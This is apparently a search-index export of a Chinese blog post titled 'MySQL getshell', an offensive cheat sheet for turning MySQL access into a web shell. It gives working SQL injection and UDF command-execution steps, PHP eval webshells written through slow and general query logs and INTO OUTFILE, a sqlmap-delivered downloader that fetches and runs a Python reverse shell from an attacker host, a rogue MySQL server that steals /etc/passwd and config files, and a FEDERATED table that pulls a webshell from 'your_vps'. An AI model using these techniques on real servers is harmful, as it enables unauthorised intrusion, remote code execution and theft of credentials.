[{"content":"UDF (\u0026ndash;os-shell) 利用条件 数据库为DBA,可以使用sqlmap的--is-dba查看当前网站连接的数据库账户是否是管理员\nsecure_file_priv没有具体值\n查找:\r1. --sql-shell 1. 进入数据库后: SHOW VARS LIKE \u0026#39;secure_file_priv\u0026#39;;\r2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL 返回正常则null,无法写入\r页面异常则,则不是null\r判断是否为空:\r?id=1 AND length(@@secure_file_priv) = 0\t页面正常则为空\r3. 尝试写入文件: ?id=1 INTO OUTFILE \u0026#39;/var/www/html/test.txt\u0026#39; -- 根据报错信息判断\r4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=\u0026#39;FILE\u0026#39; AND grantee=CONCAT(\u0026#34;\u0026#39;\u0026#34;, (SELECT CURRENT_USER()), \u0026#34;\u0026#39;\u0026#34;)) IS NOT NULL\t即使secure_file_priv为空,用户没有FILE权限,也无法写入\r或者\rAND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。 知道网站的绝对路径\n查找:\r1. 注入报错信息\r2. 利用内部函数和元数据:\rApache (Ubuntu): UNION SELECT 1, load_file(\u0026#39;/etc/apache2/sites-enabled/000-default.conf\u0026#39;), 3\rNginx: UNION SELECT 1, load_file(\u0026#39;/etc/nginx/nginx.conf\u0026#39;), 3\rWindows (IIS): C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\r3.常见的默认路径:\rLinux (Apache)\t/var/www/html/, /var/www/www.example.com/\rLinux (Nginx)\t/usr/share/nginx/html/, /var/www/html/\rWindows (IIS)\tC:\\inetpub\\wwwroot\\\rWindows (XAMPP)\tC:\\xampp\\htdocs\\\rWindows (phpStudy)\tD:\\phpstudy_pro\\WWW\\, C:\\phpStudy\\WWW\\ 漏洞复现 方法一: \u0026ndash;os-shell\n方法二: 手动构造\n1. -- 查看架构（确定是 Windows/Linux 及 x64/x86）\rshow variables like \u0026#39;%compile%\u0026#39;; 2. -- 查看插件存放目录\rshow variables like \u0026#39;plugin_dir\u0026#39;;\r3. 准备udf文件: https://www.sqlsec.com/udf/\r4. 将文件写入插件目录(最好DUMPFILE,outfile也能写但是不处理换行符)\rSELECT 0x7f45... INTO DUMPFILE \u0026#39;/usr/lib/mysql/plugin/udf.so\u0026#39;;\r5. 创建关联函数\r-- 创建名为 sys_eval 的函数，关联到刚才上传的库文件\rCREATE FUNCTION sys_eval RETURNS STRING SONAME \u0026#39;udf.so\u0026#39;;\r6.执行系统命令\rSELECT sys_eval(\u0026#39;whoami\u0026#39;); 慢日志 getshell 利用条件 高权限(super或SYSTEM_CARIABLES_ADMIN)\n查看权限(MYSQL 8.0+ 引入的细分权限)\rSELECT * FROM information_schema.user_privileges WHERE grantee = CONCAT(\u0026#34;\u0026#39;\u0026#34;, CURRENT_USER(), \u0026#34;\u0026#39;\u0026#34;); 绝对路径: 知道web目录的绝对路径\n配置允许: 运行mysql的系统用户对Web目录有写入权限\n尝试写文件判断SELECT \u0026#39;test\u0026#39; INTO OUTFILE \u0026#39;/var/www/html/check.txt\u0026#39;; 漏洞复现 查询服务器默认时间\rshow global variables like \u0026#39;%long_query_time%\u0026#39;\rshow global variables like \u0026#39;%long%\u0026#39;\r查看慢日志参数\rshow global variables like \u0026#39;%slow%\u0026#39;\r开启慢日志\rSET GLOBAL slow_query_log = \u0026#39;ON\u0026#39;;\r修改日志路径为 Web 目录下的 PHP 文件\rSET GLOBAL slow_query_log_file = \u0026#39;C:/phpStudy/WWW/info.php\u0026#39;;\rSELECT \u0026#39;\u0026lt;?php @eval($_POST[1]);?\u0026gt;\u0026#39; or sleep(11)\t# 这里的时间必须超过慢日志的时间\r可以选择更改时间\rSET GLOBAL long_query_time = 1;\r测试连接: http://example/text.php general_log getshell 利用条件 高权限(root) 已知web根目录物理路径 对web目录有写入权限 介绍 相关参数一共有3个：general_log、log_output、general_log_file\rshow variables like \u0026#39;general_log\u0026#39;; # 查看日志是否开启\rset global general_log=on; # 开启日志功能\rshow variables like \u0026#39;general_log_file\u0026#39;; # 看看日志文件保存位置\rset global general_log_file=\u0026#39;C:/phpStudy/WWW/shell.php\u0026#39;; # 设置日志文件保存位置\rshow variables like \u0026#39;log_output\u0026#39;; -- 看看日志输出类型 table或file\rset global log_output=\u0026#39;table\u0026#39;; -- 设置输出类型为 table\rset global log_output=\u0026#39;file\u0026#39;; -- 设置输出类型为file\r一般log_output都是file,就是将日志存入文件中。table的话就是将日志存入数据库的日志表中。(table就会失败) 漏洞复现 set global general_log=\u0026#39;on\u0026#39;;\rset global general_log_file=\u0026#39;C:/phpStudy/WWW/shell.php\u0026#39;\rselect \u0026#39;\u0026lt;?php @eval($_POST[\u0026#39;pwd\u0026#39;]);?\u0026gt;\u0026#39;;\r# 测试\rhttp://example/shell.php into_outfile方法 getshell 利用条件 secure_file_priv为空 知道web绝对路径 必须有FILE权限 漏洞复现 \u0026#39; union select 1,2,3,\u0026#34;\u0026lt;?php system($_POST[\u0026#39;x\u0026#39;]);?\u0026gt;\u0026#34;,5,6,7,8 into outfile \u0026#39;/var/www/sqli_shell.php\u0026#39;# 远程加载拿shell 思路一 可以用来绕过文件字符过多失败\n利用sqlmap的文件写入,写了一个下载器 使用下载器连接vps下载真正的payload 反弹shell # 准备脚本\r//shell8888.py\rexport RHOST=\u0026#34;10.10.10.128\u0026#34;;export RPORT=8888;python -c \u0026#39;import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\u0026#34;RHOST\u0026#34;),int(os.getenv(\u0026#34;RPORT\u0026#34;))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39;\r//get8888.php\r\u0026lt;?php system(\u0026#39;cd /tmp;wget http://10.10.10.128:81/shell8888.py;chmod +x shell8888.py;./shell8888.py\u0026#39;)?\u0026gt;\r# sqlmap上传get8888.php\r//上传shell\rsqlmap -u \u0026#39;http://10.10.10.100/login.php\u0026#39; --data=\u0026#39;email=admin\u0026amp;pass=admin\u0026amp;submit=Login\u0026#39; --file-write=\u0026#39;get8888.php\u0026#39; --file-dest=\u0026#39;/var/www/get8888.php\u0026#39;\r# 本地开启监听\rnc -lvvp 8888\r# 本地开启web下载服务\rphp -S 0:81\r# 浏览器远程访问加载get8888.php\rhttp://10.10.10.100/shell8888.py 思路二 当客户端(Web服务器)执行LOAD DATA LOCAL INFILE时,MySQL协议允许服务端请求客户端机器上的任何文件\n利用条件 关键条件：目标客户端（如 PHP 的 mysqli 或 PDO）必须开启了 local-infile 选项。 网络连通性： 目标服务器必须能访问外网（或你的 VPS IP）。 攻击步骤 部署恶意服务端：使用开源工具（如 Rogue-MySql-Server）在你的公网服务器上搭建。 配置读取路径： 在恶意服务端配置你想要读取的文件（如 /etc/passwd 或网站配置文件 config.php）。 触发连接： 方式 A： 目标网站有一个“配置远程数据库”的功能（如安装引导、后台数据库迁移）。 方式 B： 目标有 SSRF 漏洞，可以伪造请求连接你的 IP。 方式 C：目标有 SQL 注入，通过 LOAD DATA LOCAL INFILE 指令强制其连接你的服务器。 获取敏感信息：目标连接成功的一瞬间，它会自动把文件内容发送给你。 拿到 Shell：通过读取到的 config.php 获取其真正的数据库密码，或者找到源码泄露，再配合之前说的 into outfile 拿到 Shell。 思路三 利用Federated存储引擎(远程表映射)\n利用条件 引擎开启：默认情况下 MySQL 是不开启 FEDERATED 的，需在 my.cnf 配置。 权限： 需要有 CREATE TABLE 权限。 利用步骤 检测引擎: 执行SHOW ENGINES;,确认FEDERATED状态为yes vps准备: 在vps上创建一个真实的数据库和表,并在表中插入Webshell代码(十六进制) 建立映射: 在目标数据库执行CREATE TABLE,使用ENGINE=FEDERATED指向vps数据库 CREATE TABLE fake_table (cmd TEXT) ENGINE=FEDERATED CONNECTION=\u0026#39;mysql://evil_user:password@your_vps:3306/db/real_table\u0026#39;; 数据拉取与落地: 利用 INSERT INTO ... SELECT 将远程表中的木马内容导入到目标本地，并配合 INTO OUTFILE 导出。\nSELECT cmd FROM fake_table INTO OUTFILE \u0026#39;/var/www/html/shell.php\u0026#39;; 数据库备份 getshell 网站对上传的文件后缀进行过滤，不允许上传脚本类型文件如asp/php/jsp/aspx等。\n而网站具有数据库备份功能，这时我们就可以将webshell格式先改为允许上传的文件格式，如jpg、gif等，然后，我们找到上传后的文件路径，通过数据库备份，将文件备份为脚本格式。\n","permalink":"http://localhost:1313/posts/mysql-getshell/","summary":"\u003ch2 id=\"udf--os-shell\"\u003eUDF  (\u0026ndash;os-shell)\u003c/h2\u003e\n\u003ch3 id=\"利用条件\"\u003e利用条件\u003c/h3\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003e数据库为DBA,可以使用sqlmap的\u003ccode\u003e--is-dba\u003c/code\u003e查看当前网站连接的数据库账户是否是管理员\u003c/p\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e\u003ccode\u003esecure_file_priv\u003c/code\u003e没有具体值\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e查找:\r\n1. --sql-shell \r\n1. 进入数据库后: SHOW VARS LIKE \u0026#39;secure_file_priv\u0026#39;;\r\n2. 盲注:使用length()函数推测: ?id=1 AND (SELECT @@secure_file_priv) IS NULL \r\n\t返回正常则null,无法写入\r\n\t页面异常则,则不是null\r\n\t判断是否为空:\r\n\t?id=1 AND length(@@secure_file_priv) = 0\t页面正常则为空\r\n3. 尝试写入文件: ?id=1 INTO OUTFILE \u0026#39;/var/www/html/test.txt\u0026#39; -- 根据报错信息判断\r\n4.权限检查: ?id=1 AND (SELECT user_privileges FROM information_schema.user_privileges WHERE privilege_type=\u0026#39;FILE\u0026#39; AND grantee=CONCAT(\u0026#34;\u0026#39;\u0026#34;, (SELECT CURRENT_USER()), \u0026#34;\u0026#39;\u0026#34;)) IS NOT NULL\t即使secure_file_priv为空,用户没有FILE权限,也无法写入\r\n或者\r\nAND (SELECT 1 FROM mysql.user LIMIT 1)，如果能访问 mysql 库，通常意味着是高权限。\n\u003c/code\u003e\u003c/pre\u003e\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003e知道网站的绝对路径\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e查找:\r\n1. 注入报错信息\r\n2. 利用内部函数和元数据:\r\nApache (Ubuntu):  UNION SELECT 1, load_file(\u0026#39;/etc/apache2/sites-enabled/000-default.conf\u0026#39;), 3\r\nNginx:               UNION SELECT 1, load_file(\u0026#39;/etc/nginx/nginx.conf\u0026#39;), 3\r\nWindows (IIS):       C:\\Windows\\System32\\inetsrv\\config\\applicationHost.config\r\n3.常见的默认路径:\r\nLinux (Apache)\t/var/www/html/, /var/www/www.example.com/\r\nLinux (Nginx)\t/usr/share/nginx/html/, /var/www/html/\r\nWindows (IIS)\tC:\\inetpub\\wwwroot\\\r\nWindows (XAMPP)\tC:\\xampp\\htdocs\\\r\nWindows (phpStudy)\tD:\\phpstudy_pro\\WWW\\, C:\\phpStudy\\WWW\\\n\u003c/code\u003e\u003c/pre\u003e\u003ch3 id=\"漏洞复现\"\u003e漏洞复现\u003c/h3\u003e\n\u003cp\u003e方法一: \u0026ndash;os-shell\u003c/p\u003e","title":"MySQL getshell"}]